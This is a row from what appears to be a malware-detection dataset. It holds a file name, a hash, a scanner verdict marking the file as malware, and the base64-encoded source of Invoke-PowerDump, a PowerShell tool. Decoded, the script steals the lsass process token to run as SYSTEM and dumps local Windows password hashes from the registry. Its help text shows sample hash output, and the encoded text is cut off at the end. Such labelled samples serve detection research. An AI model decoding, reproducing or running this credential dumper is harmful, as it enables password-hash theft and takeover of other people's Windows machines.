Invoke-PowerDump.ps1,4b40e3cded8d1c0236e772c269da94be,Scan result is 32768. IsMalware: 1,IyBQdWxsZWQgZnJvbSBkYXJrb3BlcmF0b3IncyBQb3NoLVNlY01vZDogCiMgICBodHRwczovL2dpdGh1Yi5jb20vZGFya29wZXJhdG9yL1Bvc2gtU2VjTW9kL2Jsb2IvbWFzdGVyL1Bvc3RFeHBsb2l0YXRpb24vUG9zdEV4cGxvaXRhdGlvbi5wc20xCmZ1bmN0aW9uIEludm9rZS1Qb3dlckR1bXAKewogIDwjCiAgLlNZTk9QU0lTCiAgICAgRHVtcHMgaGFzaGVzIGZyb20gdGhlIGxvY2FsIHN5c3RlbS4gTm90ZTogYWRtaW5pc3RyYXRpdmUgcHJpdmlsZWdlcyByZXF1aXJlZC4KICAuREVTQ1JJUFRJT04KICAgIEdlbmVyYXRlIGEgY29tbWFuZCBmb3IgZHVtcGluZyBoYXNoZXMgZnJvbSBhIFdpbmRvd3MgU3lzdGVtIFBvd2VyU2hlbGwuZXhlIC1jb21tYW5kIAogICAgQ29tbWFuZCBtdXN0IGJlIGV4ZWN1dGVkIGFzIFNZU1RFTSBpZiByYW4gYXMgYWRtaW5pc3RyYXRvciBpdCB3aWxsIHByaXZpbGFnZSBlc2NhbGF0ZSB0byBTWVNURU0KICAgIGFuZCBleGVjdXRlIGEgaGFzaGR1bXAgYnkgcmVhZGluZyB0aGUgaGFzaGVzIGZyb20gdGhlIHJlZ2lzdHJ5LgogIC5FWEFNUExFCiAgICAkZW5jID0gR2V0LVBvc3RIYXNoZHVtcFNjcmlwdAogICAgQzpcUFM+cG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgJGVuYwogICAgICBBZG1pbmlzdHJhdG9yOjUwMDphYWQzYjQzNWI1MTQwNGVlYWFkM2I0MzViNTE0MDRlZTozMWQ0YWZlMWQxNmFlOTMxYjc0YzU5ZDdlMWMwODljMDo6OgogICAgICBHdWVzdDo1MDE6YWFkM2I0MzViNTE0MDRlZWFhZDNiNDM1YjUxNDA0ZWU6MzFkNmNmZTBkMTZhZTkzMWI3M2M1OWQ3ZTBjMDg5YzA6OjoKICAgICAgQ2FybG9zOjEwMDE6YWFkM2I0MzViNTE0MDRlZWFhZDNiNDM1YjUxNDA0ZWU6NjIwOTZlNWVkODNhMTBjZjYxY2Y3OWNjMzY3Mzg1MTk6OjoKICAgICAgSG9tZUdyb3VwVXNlciQ6MTAwMzphYWQzYjQzNWI1MTQwNGVlYWFkM2I0MzViNTE0MDRlZTo5NTFiMjcxYTRiN2QxZGQ3YTI1ZTNkOWM5Zjg3MzQxZTo6OgogICAgRXhlY3V0ZXMgdGhlIGNvbXByZXNzZWQgY29tbWFuZCBnZW5lcmF0ZWQgYnkgdGhlIGZ1bmN0aW9uIGFuZCBkdW1wcyB0aGUgd2luZG93cyBoYXNoZXMgZnJvbSB0aGUgcmVnaXN0cnkuCiAgIAogICAuTk9URVMKICAgICBQb3dlckR1bXAgc2NyaXB0IGJ5IEthdGh5IFBldGVycywgSm9zaCBLZWxsZXkgKHdpbmZhbmcpIGFuZCBEYXZlIEtlbm5lZHkgKFJlTDFLKQogICAgIFByaXZpbGFnZSBFc2NhbGF0aW9uIGZyb20gaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wNS91c2UtcG93ZXJzaGVsbC10by1kdXBsaWNhdGUtcHJvY2Vzcy10b2tlbnMtdmlhLXAtaW52b2tlLmFzcHgKICAjPgoKJHNpZ24gPSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIHN0YXRpYyBjbGFzcyBwcml2CnsKICAgIFtEbGxJbXBvcnQoInNoZWxsMzIuZGxsIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIElzVXNlckFuQWRtaW4oKTsKfQoiQAogICAgJGFkbWluYXNlbWJseSA9IEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkc2lnbiAtTGFuZ3VhZ2UgQ1NoYXJwIC1QYXNzVGhydQogICAgZnVuY3Rpb24gRWxldmF0ZVByaXZzCiAgICB7CiRzaWduYXR1cmUgPSBAIiAKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBQYWNrID0gMSldIAogICAgIHB1YmxpYyBzdHJ1Y3QgVG9rUHJpdjFMdWlkIAogICAgIHsgCiAgICAgICAgIHB1YmxpYyBpbnQgQ291bnQ7IAogICAgICAgICBwdWJsaWMgbG9uZyBMdWlkOyAKICAgICAgICAgcHVibGljIGludCBBdHRyOyAKICAgICB9IAogCiAgICBwdWJsaWMgY29uc3QgaW50IFNFX1BSSVZJTEVHRV9FTkFCTEVEID0gMHgwMDAwMDAwMjsgCiAgICBwdWJsaWMgY29uc3QgaW50IFRPS0VOX1FVRVJZID0gMHgwMDAwMDAwODsgCiAgICBwdWJsaWMgY29uc3QgaW50IFRPS0VOX0FESlVTVF9QUklWSUxFR0VTID0gMHgwMDAwMDAyMDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFNUQU5EQVJEX1JJR0hUU19SRVFVSVJFRCA9IDB4MDAwRjAwMDA7IAogCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFNUQU5EQVJEX1JJR0hUU19SRUFEID0gMHgwMDAyMDAwMDsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0FTU0lHTl9QUklNQVJZID0gMHgwMDAxOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fRFVQTElDQVRFID0gMHgwMDAyOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fSU1QRVJTT05BVEUgPSAweDAwMDQ7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9RVUVSWV9TT1VSQ0UgPSAweDAwMTA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BREpVU1RfR1JPVVBTID0gMHgwMDQwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fQURKVVNUX0RFRkFVTFQgPSAweDAwODA7IAogICAgcHVibGljIGNvbnN0IFVJbnQzMiBUT0tFTl9BREpVU1RfU0VTU0lPTklEID0gMHgwMTAwOyAKICAgIHB1YmxpYyBjb25zdCBVSW50MzIgVE9LRU5fUkVBRCA9IChTVEFOREFSRF9SSUdIVFNfUkVBRCB8IFRPS0VOX1FVRVJZKTsgCiAgICBwdWJsaWMgY29uc3QgVUludDMyIFRPS0VOX0FMTF9BQ0NFU1MgPSAoU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEIHwgVE9LRU5fQVNTSUdOX1BSSU1BUlkgfCAKICAgICAgVE9LRU5fRFVQTElDQVRFIHwgVE9LRU5fSU1QRVJTT05BVEUgfCBUT0tFTl9RVUVSWSB8IFRPS0VOX1FVRVJZX1NPVVJDRSB8IAogICAgICBUT0tFTl9BREpVU1RfUFJJVklMRUdFUyB8IFRPS0VOX0FESlVTVF9HUk9VUFMgfCBUT0tFTl9BREpVU1RfREVGQVVMVCB8IAogICAgICBUT0tFTl9BREpVU1RfU0VTU0lPTklEKTsgCiAKICAgIHB1YmxpYyBjb25zdCBzdHJpbmcgU0VfVElNRV9aT05FX05BTUVURVhUID0gIlNlVGltZVpvbmVQcml2aWxlZ2UiOyAKICAgIHB1YmxpYyBjb25zdCBpbnQgQU5ZU0laRV9BUlJBWSA9IDE7IAogCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldIAogICAgcHVibGljIHN0cnVjdCBMVUlEIAogICAgeyAKICAgICAgcHVibGljIFVJbnQzMiBMb3dQYXJ0OyAKICAgICAgcHVibGljIFVJbnQzMiBIaWdoUGFydDsgCiAgICB9IAogCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldIAogICAgcHVibGljIHN0cnVjdCBMVUlEX0FORF9BVFRSSUJVVEVTIHsgCiAgICAgICBwdWJsaWMgTFVJRCBMdWlkOyAKICAgICAgIHB1YmxpYyBVSW50MzIgQXR0cmlidXRlczsgCiAgICB9IAogCiAKICAgIHB1YmxpYyBzdHJ1Y3QgVE9LRU5fUFJJVklMRUdFUyB7IAogICAgICBwdWJsaWMgVUludDMyIFByaXZpbGVnZUNvdW50OyAKICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdD1BTllTSVpFX0FSUkFZKV0gCiAgICAgIHB1YmxpYyBMVUlEX0FORF9BVFRSSUJVVEVTIFtdIFByaXZpbGVnZXM7IAogICAgfSAKIAogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXSAKICAgICBwdWJsaWMgZXh0ZXJuIHN0YXRpYyBib29sIER1cGxpY2F0ZVRva2VuKEludFB0ciBFeGlzdGluZ1Rva2VuSGFuZGxlLCBpbnQgCiAgICAgICAgU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTCwgb3V0IEludFB0ciBEdXBsaWNhdGVUb2tlbkhhbmRsZSk7IAogCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0gCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0gCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNldFRocmVhZFRva2VuKCAKICAgICAgSW50UHRyIFBIVGhyZWFkLCAKICAgICAgSW50UHRyIFRva2VuIAogICAgKTsgCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0gCiAgICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldIAogICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIE9wZW5Qcm9jZXNzVG9rZW4oSW50UHRyIFByb2Nlc3NIYW5kbGUsICAKICAgICAgIFVJbnQzMiBEZXNpcmVkQWNjZXNzLCBvdXQgSW50UHRyIFRva2VuSGFuZGxlKTsgCiAKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgTG9va3VwUHJpdmlsZWdlVmFsdWUoc3RyaW5nIGhvc3QsIHN0cmluZyBuYW1lLCByZWYgbG9uZyBwbHVpZCk7IAogCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldIAogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7IAogCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldIAogICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzKEludFB0ciBodG9rLCBib29sIGRpc2FsbCwgCiAgICAgcmVmIFRva1ByaXYxTHVpZCBuZXdzdCwgaW50IGxlbiwgSW50UHRyIHByZXYsIEludFB0ciByZWxlbik7IAoiQCAKIAogICAgICAgICAgJGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKCBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkgCiAgICAgICAgICBpZigkY3VycmVudFByaW5jaXBhbC5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpIC1uZSAkdHJ1ZSkgeyAKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiUnVuIHRoZSBDb21tYW5kIGFzIGFuIEFkbWluaXN0cmF0b3IiIAogICAgICAgICAgICBCcmVhayAKICAgICAgICAgIH0gCiAKICAgICAgICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uICRzaWduYXR1cmUgLU5hbWUgQWRqUHJpdiAtTmFtZXNwYWNlIEFkalByaXYgCiAgICAgICAgICAkYWRqUHJpdiA9IFtBZGpQcml2LkFkalByaXZdIAogICAgICAgICAgW2xvbmddJGx1aWQgPSAwIAogCiAgICAgICAgICAkdG9rUHJpdjFMdWlkID0gTmV3LU9iamVjdCBBZGpQcml2LkFkalByaXYrVG9rUHJpdjFMdWlkIAogICAgICAgICAgJHRva1ByaXYxTHVpZC5Db3VudCA9IDEgCiAgICAgICAgICAkdG9rUHJpdjFMdWlkLkx1aWQgPSAkbHVpZCAKICAgICAgICAgICR0b2tQcml2MUx1aWQuQXR0ciA9IFtBZGpQcml2LkFkalByaXZdOjpTRV9QUklWSUxFR0VfRU5BQkxFRCAKIAogICAgICAgICAgJHJldFZhbCA9ICRhZGpQcml2OjpMb29rdXBQcml2aWxlZ2VWYWx1ZSgkbnVsbCwgIlNlRGVidWdQcml2aWxlZ2UiLCBbcmVmXSR0b2tQcml2MUx1aWQuTHVpZCkgCiAgCiAgICAgICAgICBbSW50UHRyXSRodG9rZW4gPSBbSW50UHRyXTo6WmVybyAKICAgICAgICAgICRyZXRWYWwgPSAkYWRqUHJpdjo6T3BlblByb2Nlc3NUb2tlbigkYWRqUHJpdjo6R2V0Q3VycmVudFByb2Nlc3MoKSwgW0FkalByaXYuQWRqUHJpdl06OlRPS0VOX0FMTF9BQ0NFU1MsIFtyZWZdJGh0b2tlbikgCiAgIAogICAKICAgICAgICAgICR0b2tlblByaXZpbGVnZXMgPSBOZXctT2JqZWN0IEFkalByaXYuQWRqUHJpditUT0tFTl9QUklWSUxFR0VTIAogICAgICAgICAgJHJldFZhbCA9ICRhZGpQcml2OjpBZGp1c3RUb2tlblByaXZpbGVnZXMoJGh0b2tlbiwgJGZhbHNlLCBbcmVmXSR0b2tQcml2MUx1aWQsIDEyLCBbSW50UHRyXTo6WmVybywgW0ludFB0cl06Olplcm8pIAogCiAgICAgICAgICBpZigtbm90KCRyZXRWYWwpKSB7IAogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpIAogICAgICAgICAgICBCcmVhayAKICAgICAgICAgIH0gCiAKICAgICAgICAgICRwcm9jZXNzID0gKEdldC1Qcm9jZXNzIC1OYW1lIGxzYXNzKSAKICAgICAgICAgICMkcHJvY2Vzcy5uYW1lCiAgICAgICAgICBbSW50UHRyXSRobHNhc3N0b2tlbiA9IFtJbnRQdHJdOjpaZXJvIAogICAgICAgICAgJHJldFZhbCA9ICRhZGpQcml2OjpPcGVuUHJvY2Vzc1Rva2VuKCRwcm9jZXNzLkhhbmRsZSwgKFtBZGpQcml2LkFkalByaXZdOjpUT0tFTl9JTVBFUlNPTkFURSAtQk9SIFtBZGpQcml2LkFkalByaXZdOjpUT0tFTl9EVVBMSUNBVEUpLCBbcmVmXSRobHNhc3N0b2tlbikgCiAKICAgICAgICAgIFtJbnRQdHJdJGR1bGljYXRlVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybyAKICAgICAgICAgICRyZXRWYWwgPSAkYWRqUHJpdjo6RHVwbGljYXRlVG9rZW4oJGhsc2Fzc3Rva2VuLCAyLCBbcmVmXSRkdWxpY2F0ZVRva2VuSGFuZGxlKSAKICAKICAgICAgICAgICRyZXR2YWwgPSAkYWRqUHJpdjo6U2V0VGhyZWFkVG9rZW4oW0ludFB0cl06Olplcm8sICRkdWxpY2F0ZVRva2VuSGFuZGxlKSAKICAKICAgICAgICAgIGlmKC1ub3QoJHJldFZhbCkpIHsgCiAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMubWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkgCiAgICAgICAgICB9IAogICAgICB9CiAgICAgIGZ1bmN0aW9uIExvYWRBcGkKICAgICAgICB7CiAgICAgICAgJG9sZEVycm9yQWN0aW9uID0gJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2U7CiAgICAgICAgJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2UgPSAiU2lsZW50bHlDb250aW51ZSI7CiAgICAgICAgJHRlc3QgPSBbUG93ZXJEdW1wLk5hdGl2ZV07CiAgICAgICAgJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2UgPSAkb2xkRXJyb3JBY3Rpb247CiAgICAgICAgaWYgKCR0ZXN0KSAKICAgICAgICB7CiAgICAgICAgICAgICMgYWxyZWFkeSBsb2FkZWQKICAgICAgICAgICAgcmV0dXJuOyAKICAgICAgICB9CiRjb2RlID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Owp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwpuYW1lc3BhY2UgUG93ZXJEdW1wCnsKICAgIHB1YmxpYyBjbGFzcyBOYXRpdmUKICAgIHsKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBSZWdPcGVuS2V5RXgoCiAgICAgICAgaW50IGhLZXksCiAgICAgICAgc3RyaW5nIHN1YktleSwKICAgICAgICBpbnQgdWxPcHRpb25zLAogICAgICAgIGludCBzYW1EZXNpcmVkLAogICAgICAgIG91dCBpbnQgaGtSZXN1bHQpOwogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludCA9ICJSZWdFbnVtS2V5RXgiKV0KICAgIGV4dGVybiBwdWJsaWMgc3RhdGljIGludCBSZWdFbnVtS2V5RXgoCiAgICAgICAgaW50IGhrZXksCiAgICAgICAgaW50IGluZGV4LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBOYW1lLAogICAgICAgIHJlZiBpbnQgbHBjYk5hbWUsCiAgICAgICAgaW50IHJlc2VydmVkLAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBvdXQgbG9uZyBscGZ0TGFzdFdyaXRlVGltZSk7CiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBFbnRyeVBvaW50PSJSZWdRdWVyeUluZm9LZXkiLCBDYWxsaW5nQ29udmVudGlvbj1DYWxsaW5nQ29udmVudGlvbi5XaW5hcGksIFNldExhc3RFcnJvcj10cnVlKV0KICAgIGV4dGVybiBwdWJsaWMgc3RhdGljIGludCBSZWdRdWVyeUluZm9LZXkoCiAgICAgICAgaW50IGhrZXksCiAgICAgICAgU3RyaW5nQnVpbGRlciBscENsYXNzLAogICAgICAgIHJlZiBpbnQgbHBjYkNsYXNzLAogICAgICAgIGludCBscFJlc2VydmVkLAogICAgICAgIG91dCBpbnQgbHBjU3ViS2V5cywKICAgICAgICBvdXQgaW50IGxwY2JNYXhTdWJLZXlMZW4sCiAgICAgICAgb3V0IGludCBscGNiTWF4Q2xhc3NMZW4sCiAgICAgICAgb3V0IGludCBscGNWYWx1ZXMsCiAgICAgICAgb3V0IGludCBscGNiTWF4VmFsdWVOYW1lTGVuLAogICAgICAgIG91dCBpbnQgbHBjYk1heFZhbHVlTGVuLAogICAgICAgIG91dCBpbnQgbHBjYlNlY3VyaXR5RGVzY3JpcHRvciwKICAgICAgICBJbnRQdHIgbHBmdExhc3RXcml0ZVRpbWUpOwogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFJlZ0Nsb3NlS2V5KAogICAgICAgIGludCBoS2V5KTsKICAgICAgICB9CiAgICB9IC8vIGVuZCBuYW1lc3BhY2UgUG93ZXJEdW1wCiAgICBwdWJsaWMgY2xhc3MgU2hpZnQgewogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50ICAgUmlnaHQoaW50IHgsICAgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50ICBSaWdodCh1aW50IHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIGxvbmcgIFJpZ2h0KGxvbmcgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWxvbmcgUmlnaHQodWxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgICAgTGVmdChpbnQgeCwgICBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVpbnQgICBMZWZ0KHVpbnQgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgbG9uZyAgIExlZnQobG9uZyB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1bG9uZyAgTGVmdCh1bG9uZyB4LCBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgIH0KIkAKICAgICAgICAgICAkcHJvdmlkZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5DU2hhcnAuQ1NoYXJwQ29kZVByb3ZpZGVyCiAgICAgICAgICAgJGRsbE5hbWUgPSBbUHNPYmplY3RdLkFzc2VtYmx5LkxvY2F0aW9uCiAgICAgICAgICAgJGNvbXBpbGVyUGFyYW1ldGVycyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIuQ29tcGlsZXJQYXJhbWV0ZXJzCiAgICAgICAgICAgJGFzc2VtYmxpZXMgPSBAKCJTeXN0ZW0uZGxsIiwgJGRsbE5hbWUpCiAgICAgICAgICAgJGNvbXBpbGVyUGFyYW1ldGVycy5SZWZlcmVuY2VkQXNzZW1ibGllcy5BZGRSYW5nZSgkYXNzZW1ibGllcykKICAgICAgICAgICAkY29tcGlsZXJQYXJhbWV0ZXJzLkdlbmVyYXRlSW5NZW1vcnkgPSAkdHJ1ZQogICAgICAgICAgICRjb21waWxlclJlc3VsdHMgPSAkcHJvdmlkZXIuQ29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZSgkY29tcGlsZXJQYXJhbWV0ZXJzLCAkY29kZSkKICAgICAgICAgICBpZigkY29tcGlsZXJSZXN1bHRzLkVycm9ycy5Db3VudCAtZ3QgMCkgewogICAgICAgICAgICAgJGNvbXBpbGVyUmVzdWx0cy5FcnJvcnMgfCAlIHsgV3JpdGUtRXJyb3IgKCJ7MH06YHR7MX0iIC1mICRfLkxpbmUsJF8uRXJyb3JUZXh0KSB9CiAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkYW50cGFzc3dvcmQgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCJOVFBBU1NXT1JEYDAiKTsKICAgICAgICAkYWxtcGFzc3dvcmQgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCJMTVBBU1NXT1JEYDAiKTsKICAgICAgICAkZW1wdHlfbG0gPSBbYnl0ZVtdXUAoMHhhYSwweGQzLDB4YjQsMHgzNSwweGI1LDB4MTQsMHgwNCwweGVlLDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSk7CiAgICAgICAgJGVtcHR5X250ID0gW2J5dGVbXV1AKDB4MzEsMHhkNiwweGNmLDB4ZTAsMHhkMSwweDZhLDB4ZTksMHgzMSwweGI3LDB4M2MsMHg1OSwweGQ3LDB4ZTAsMHhjMCwweDg5LDB4YzApOwogICAgICAgICRvZGRfcGFyaXR5ID0gQCgKICAgICAgICAgIDEsIDEsIDIsIDIsIDQsIDQsIDcsIDcsIDgsIDgsIDExLCAxMSwgMTMsIDEzLCAxNCwgMTQsCiAgICAgICAgICAxNiwgMTYsIDE5LCAxOSwgMjEsIDIxLCAyMiwgMjIsIDI1LCAyNSwgMjYsIDI2LCAyOCwgMjgsIDMxLCAzMSwKICAgICAgICAgIDMyLCAzMiwgMzUsIDM1LCAzNywgMzcsIDM4LCAzOCwgNDEsIDQxLCA0MiwgNDIsIDQ0LCA0NCwgNDcsIDQ3LAogICAgICAgICAgNDksIDQ5LCA1MCwgNTAsIDUyLCA1MiwgNTUsIDU1LCA1NiwgNTYsIDU5LCA1OSwgNjEsIDYxLCA2MiwgNjIsCiAgICAgICAgICA2NCwgNjQsIDY3LCA2NywgNjksIDY5LCA3MCwgNzAsIDczLCA3MywgNzQsIDc0LCA3NiwgNzYsIDc5LCA3OSwKICAgICAgICAgIDgxLCA4MSwgODIsIDgyLCA4NCwgODQsIDg3LCA4NywgODgsIDg4LCA5MSwgOTEsIDkzLCA5MywgOTQsIDk0LAogICAgICAgICAgOTcsIDk3LCA5OCwgOTgsMTAwLDEwMCwxMDMsMTAzLDEwNCwxMDQsMTA3LDEwNywxMDksMTA5LDExMCwxMTAsCiAgICAgICAgICAxMTIsMTEyLDExNSwxMTUsMTE3LDExNywxMTgsMTE4LDEyMSwxMjEsMTIyLDEyMiwxMjQsMTI0LDEyNywxMjcsCiAgICAgICAgICAxMjgsMTI4LDEzMSwxMzEsMTMzLDEzMywxMzQsMTM0LDEzNywxMzcsMTM4LDEzOCwxNDAsMTQwLDE0MywxNDMsCiAgICAgICAgICAxNDUsMTQ1LDE0NiwxNDYsMTQ4LDE0OCwxNTEsMTUxLDE1MiwxNTIsMTU1LDE1NSwxNTcsMTU3LDE1OCwxNTgsCiAgICAgICAgICAxNjEsMTYxLDE2MiwxNjIsMTY0LDE2NCwxNjcsMTY3LDE2OCwxNjgsMTcxLDE3MSwxNzMsMTczLDE3NCwxNzQsCiAgICAgICAgICAxNzYsMTc2LDE3OSwxNzksMTgxLDE4MSwxODIsMTgyLDE4NSwxODUsMTg2LDE4NiwxODgsMTg4LDE5MSwxOTEsCiAgICAgICAgICAxOTMsMTkzLDE5NCwxOTQsMTk2LDE5NiwxOTksMTk5LDIwMCwyMDAsMjAzLDIwMywyMDUsMjA1LDIwNiwyMDYsCiAgICAgICAgICAyMDgsMjA4LDIxMSwyMTEsMjEzLDIxMywyMTQsMjE0LDIxNywyMTcsMjE4LDIxOCwyMjAsMjIwLDIyMywyMjMsCiAgICAgICAgICAyMjQsMjI0LDIyNywyMjcsMjI5LDIyOSwyMzAsMjMwLDIzMywyMzMsMjM0LDIzNCwyMzYsMjM2LDIzOSwyMzksCiAgICAgICAgICAyNDEsMjQxLDI0MiwyNDIsMjQ0LDI0NCwyNDcsMjQ3LDI0OCwyNDgsMjUxLDI1MSwyNTMsMjUzLDI1NCwyNTQKICAgICAgICApOwogICAgICAgIGZ1bmN0aW9uIHNpZF90b19rZXkoJHNpZCkKICAgICAgICB7CiAgICAgICAgICAgICRzMSA9IEAoKTsKICAgICAgICAgICAgJHMxICs9IFtjaGFyXSgkc2lkIC1iYW5kIDB4RkYpOwogICAgICAgICAgICAkczEgKz0gW2NoYXJdKFtTaGlmdF06OlJpZ2h0KCRzaWQsOCkgLWJhbmQgMHhGRik7CiAgICAgICAgICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCwxNikgLWJhbmQgMHhGRik7CiAgICAgICAgICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCwyNCkgLWJhbmQgMHhGRik7CiAgICAgICAgICAgICRzMSArPSAkczFbMF07CiAgICAgICAgICAgICRzMSArPSAkczFbMV07CiAgICAgICAgICAgICRzMSArPSAkczFbMl07CiAgICAgICAgICAgICRzMiA9IEAoKTsKICAgICAgICAgICAgJHMyICs9ICRzMVszXTsgJHMyICs9ICRzMVswXTsgJHMyICs9ICRzMVsxXTsgJHMyICs9ICRzMVsyXTsKICAgICAgICAgICAgJHMyICs9ICRzMlswXTsgJHMyICs9ICRzMlsxXTsgJHMyICs9ICRzMlsyXTsKICAgICAgICAgICAgcmV0dXJuICwoKHN0cl90b19rZXkgJHMxKSwoc3RyX3RvX2tleSAkczIpKTsKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gc3RyX3RvX2tleSgkcykKICAgICAgICB7CiAgICAgICAgICAgICRrZXkgPSBAKCk7CiAgICAgICAgICAgICRrZXkgKz0gW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbMF0pLCAxICk7CiAgICAgICAgICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1swXSkgLWJhbmQgMHgwMSksIDYpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbMV0pLDIpOwogICAgICAgICAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0